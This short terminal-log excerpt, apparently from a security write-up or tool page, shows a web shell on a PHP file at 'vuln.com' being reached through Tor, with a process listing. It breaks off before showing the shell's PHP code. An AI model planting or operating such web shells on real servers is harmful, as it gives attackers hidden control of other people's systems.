...
$ torify webshell 'https://vuln.com/path/to/ajax.php'
Welcome to WebShell!
...
root  787446  0.0  0.0 383416 10240 ?        Ss   00:46   0:00 lsphp:vuln.com/public_html/path/to/ajax.php
...
Contents of `/server/path/to/ajax.php` (PHP shell):
